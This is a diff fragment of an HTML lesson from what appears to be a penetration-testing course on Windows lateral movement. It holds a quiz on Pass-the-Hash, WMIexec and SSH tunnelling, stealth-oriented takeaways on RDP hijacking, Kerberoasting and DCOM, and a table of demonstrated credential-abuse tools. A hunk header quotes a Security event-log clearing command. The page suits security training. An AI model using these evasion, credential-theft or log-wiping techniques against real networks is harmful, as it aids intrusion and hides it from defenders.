+<span class="step-number">9</span> <strong>PERSISTENCE</strong>
+# DCOM execution to maintain access without new services
+# SSH tunnel for encrypted C2 channel
+# See Module 16: C2 for full persistence techniques
+                </div>
+            </div>
+        </div>
+
+        <h2>🎯 Interactive Quiz — Test Your Knowledge</h2>
+
+        <div class="quiz-container" id="quiz-1">
+            <h4>Question 1: Why does Pass-the-Hash work against NTLM authentication?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                A) NTLM stores plaintext passwords in memory for quick access
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-1')">
+                B) NTLM uses the hash in challenge-response; the server never verifies the plaintext password
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                C) Windows disables hash verification when SMB signing is off
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-1')">
+                D) Pass-the-Hash only works against Windows XP and older systems
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-1"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-2">
+            <h4>Question 2: What makes WMIexec stealthier than PSExec?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                A) WMIexec uses encryption that PSExec doesn't support
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-2')">
+                B) WMIexec doesn't create a persistent service; it uses temporary WMI process creation
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                C) WMIexec doesn't require authentication
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-2')">
+                D) WMIexec runs in kernel mode, avoiding user-mode detection
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-2"></div>
+        </div>
+
+        <div class="quiz-container" id="quiz-3">
+            <h4>Question 3: In an SSH dynamic port forward (-D 1080), what happens to traffic sent through the SOCKS proxy?</h4>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                A) It is decrypted by the SSH server and sent in plaintext to the destination
+            </div>
+            <div class="quiz-option" data-correct="true" onclick="checkAnswer(this, 'quiz-3')">
+                B) It is encrypted end-to-end between your client and the SSH server, then forwarded to the destination
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                C) It is blocked by the SSH server unless the destination is in a whitelist
+            </div>
+            <div class="quiz-option" data-correct="false" onclick="checkAnswer(this, 'quiz-3')">
+                D) It is mirrored to a logging server for compliance monitoring
+            </div>
+            <div class="quiz-feedback" id="feedback-quiz-3"></div>
+        </div>
+
+        <h2>📚 Key Takeaways</h2>
 
         <ul style="margin-left: 1.5rem; line-height: 2;">
-            <li><strong>Lateral movement is logistics:</strong> You have one box; now you need a network</li>
-            <li><strong>SSH is the quietest path:</strong> Fewer events than RDP, encrypted traffic</li>
-            <li><strong>Every action leaves traces:</strong> The defender sees events; you see opportunities to blend</li>
-            <li><strong>File transfer is the chokepoint:</strong> AV scans on write. Pre-verify your tools are clean.</li>
-            <li><strong>Cleanup is harder than entry:</strong> Clearing logs alerts the defender. Better to look legitimate.</li>
+            <li><strong>Lateral movement is logistics:</strong> You have one box; now you need a network. Every protocol is a road. Every credential is a vehicle.</li>
+            <li><strong>Pass-the-Hash is the foundation:</strong> NTLM hashes are passwords. If you have the hash, you are the user. See <a href="MODULE_19_AD.html" class="cross-link">Module 19: AD</a> for hash extraction techniques.</li>
+            <li><strong>Kerberoasting is the slow game:</strong> Request tickets, crack offline, win service accounts. No domain admin required. See <a href="MODULE_19_AD.html" class="cross-link">Module 19: AD</a> for Kerberos deep dive.</li>
+            <li><strong>WMI is the quietest Windows path:</strong> No service, no file drop, just a temporary process. Perfect for stealthy command execution.</li>
+            <li><strong>PSExec is reliable but loud:</strong> When you need SYSTEM and don't care about noise. The service creation is a major artifact.</li>
+            <li><strong>SSH is the universal pivot:</strong> Cross-platform, encrypted, trusted. Local/remote/dynamic forwarding covers every scenario. See <a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a>.</li>
+            <li><strong>RDP hijacking is session theft:</strong> No credentials needed. Just SYSTEM and tscon.exe. The ultimate insider threat simulation.</li>
+            <li><strong>DCOM is the stealthy alternative:</strong> Legitimate COM objects, legitimate processes. The defender sees MMC, not malware.</li>
+            <li><strong>Every action leaves traces:</strong> The defender sees events; you see opportunities to blend. Correlation is their challenge. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a>.</li>
+            <li><strong>Cleanup is harder than entry:</strong> Clearing logs alerts the defender. Better to look legitimate. See <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> for persistence and cleanup.</li>
         </ul>
 
         <div class="evidence-box" style="margin-top: 2rem;">
@@ -356,21 +1572,108 @@ SWu@WUPC> Clear-EventLog -LogName Security
                     <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
                 </tr>
                 <tr style="border-bottom: 1px solid var(--border);">
-                    <td style="padding: 0.5rem;">KAV System Watcher (no SSH alert)</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td style="padding: 0.5rem;">Pass-the-Hash (mimikatz + CrackMapExec)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Pass-the-Ticket (Rubeus, golden ticket)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">Kerberoasting (Rubeus, hashcat)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">WMI Exec (wmiexec.py, Invoke-WmiMethod)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">PSExec (Sysinternals + Impacket)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">SMB Exec (smbexec.py, share abuse)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">RDP Hijacking (tscon, shadowing)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
+                </tr>
+                <tr style="border-bottom: 1px solid var(--border);">
+                    <td style="padding: 0.5rem;">SSH Tunneling (local/remote/dynamic)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE</td>
                 </tr>
                 <tr>
-                    <td style="padding: 0.5rem;">Windows Event 4624 (SSH logon)</td>
-                    <td style="padding: 0.5rem; color: var(--accent2);">✅ LIVE .42</td>
+                    <td style="padding: 0.5rem;">DCOM Lateral Movement (MMC20.Application)</td>
+                    <td style="padding: 0.5rem; color: var(--accent2);">✅ DEMONSTRATED</td>
                 </tr>
             </table>
         </div>
 
+        <div class="first-principle" style="margin-top: 2rem;">
+            <h3>🧠 The Mentor's Lesson</h3>
+            <p><em>"Initial access is luck. Lateral movement is skill. You can phish your way into one host, but you can't phish your way into the domain. The network is the game. Credentials are the pieces. Every protocol is a move. Learn them all, because the defender only needs to block one — you need to find the one they forgot."</em></p>
+            <p style="margin-top: 1rem; color: var(--dim);">— From <a href="MODULE_16_C2.html" class="cross-link">Module 16: C2</a> and <a href="MODULE_19_AD.html" class="cross-link">Module 19: Active Directory</a></p>
+        </div>
+
         <div class="nav" style="margin-top: 2rem;">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_14_CLOUD_FILES.html">← Module 14</a>
             <a href="MODULE_16_C2.html">Module 16 →</a>
         </div>
     </div>
+
+    <script>
+        // Copy buttons for code blocks
+        document.querySelectorAll('.code-block').forEach(block => {
+            const btn = document.createElement('button');
+            btn.className = 'copy-btn';
+            btn.textContent = 'COPY';
+            btn.addEventListener('click', () => {
+                const text = block.textContent.replace('COPY', '').trim();
+                navigator.clipboard.writeText(text).then(() => {
+                    btn.textContent = 'COPIED!';
+                    setTimeout(() => btn.textContent = 'COPY', 2000);
+                });
+            });
+            block.appendChild(btn);
+        });
+
+        // Quiz functionality
+        function checkAnswer(option, quizId) {
+            const container = document.getElementById(quizId);
+            const options = container.querySelectorAll('.quiz-option');
+            const feedback = document.getElementById('feedback-' + quizId);
+            
+            // Disable all options
+            options.forEach(opt => {
+                opt.style.pointerEvents = 'none';
+                if (opt.dataset.correct === 'true') {
+                    opt.classList.add('correct');
+                } else if (opt === option) {
+                    opt.classList.add('wrong');
+                }
+            });
+            
+            // Show feedback
+            feedback.classList.add('show');
+            if (option.dataset.correct === 'true') {
+                feedback.classList.add('correct');
+                feedback.innerHTML = '<strong>✓ CORRECT</strong><br>' + getExplanation(quizId, true);
+            } else {
+                feedback.classList.add('wrong');
+                feedback.innerHTML = '<strong>✗ WRONG</strong><br>' + getExplanation(quizId, false);
+            }
+        }
+
+        function getExplanation(quizId, isCorrect) {
+            const explanations = {
+                'quiz-1': 'NTLM challenge-response uses the hash to encrypt the server\'s challenge. The server does the same encryption and compares results. It never sees or verifies the plaintext password. If you have the hash, you can perform the encryption — the server can\'t tell you\'re not the real user.',
+                'quiz-2': 'WMIexec uses Win32_Process.Create, which spawns a temporary process via the WMI service (WmiPrvSE.exe). No service is installed, no file is dropped to disk, and no persistent artifact remains. PSExec creates PSEXESVC service, which is a major detection event.',
+                'quiz-3': 'SSH dynamic forwarding creates an encrypted tunnel between your client and the SSH server. Traffic sent to the local SOCKS proxy is encrypted, sent through the tunnel to the SSH server, then forwarded to the final destination. The encryption is end-to-end between client and server; the destination sees plaintext from the server.'
+            };
+            return explanations[quizId] || 'Keep studying!';
+        }
+    </script>
 </body>
 </html>
